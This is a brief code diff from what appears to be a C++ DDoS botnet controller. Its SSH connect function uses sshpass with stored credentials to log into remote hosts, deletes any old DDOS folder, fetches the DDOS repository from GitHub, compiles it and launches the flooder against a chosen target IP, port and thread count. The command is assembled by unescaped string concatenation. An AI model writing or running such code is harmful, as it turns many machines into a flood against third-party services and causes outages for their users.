@@ -28,6 +28,7 @@ void SSH::run() {
 
 void SSH::connect(const ConfigLibrary::Host &host) {
     utils::exec("sshpass -p '" + host.getPassword() + "' ssh " + host.getUserName() + "@" + host.getHost() +
-                " '(git clone https://github.com/amaoamao/DDOS.git&&cd DDOS&&g++ *.cpp -std=c++11 -lpthread -o ddos&&ddos -sh " +
-                this->command + ")'");
+                " '(rm -rf DDOS/&&git clone https://github.com/amaoamao/DDOS.git&&cd DDOS&&g++ *.cpp -std=c++11 -lpthread -o ddos&&./ddos -sh \"" +
+                this->command + " " + this->args.target_ip + " " + std::to_string(this->args.target_port) + " " +
+                std::to_string(this->args.thread_num) + "\")'");
 }
